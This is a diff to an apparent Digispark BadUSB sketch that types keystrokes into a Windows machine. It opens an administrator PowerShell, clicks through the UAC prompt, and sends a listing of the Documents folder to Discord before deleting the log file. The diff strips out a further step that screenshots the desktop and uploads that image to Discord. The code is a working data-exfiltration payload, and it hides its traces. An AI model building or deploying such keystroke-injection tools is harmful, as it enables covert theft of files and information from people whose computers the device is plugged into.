@@ -16,6 +16,8 @@
   PS = PowerShell
 */
 
+// Test Branch A - Only Documents contents
+
 void setup() {
   DigiKeyboard.update();
 
@@ -25,12 +27,9 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes")
-
+  DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
-
-
 
   // brings focus to the PS window
   DigiKeyboard.delay(1000);
@@ -60,24 +59,6 @@ void setup() {
 
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("rm docsFolderContents.txt"); // removes the log file after uploading to Discord
-
-  // Screenshots the computers Desktop (wallpaper)
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // minimizes all windows
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // uses the Print Screen key to take the screenshot
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // gets back to PS with Alt + Tab
-
-  // Finds the screenshot in the MyPictures folder
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$pathPics = [Environment]::GetFolderPath('MyPictures')"); // gets the folder path
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$latestFile = gci Screenshots | sort LastWriteTime | select -last 1"); // gets the latest file written
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("cd Screenshots");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println('Upload-Discord -file $latestFile.Name -text "DESKTOP WALLPAPER SCREENSHOT"');
   
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
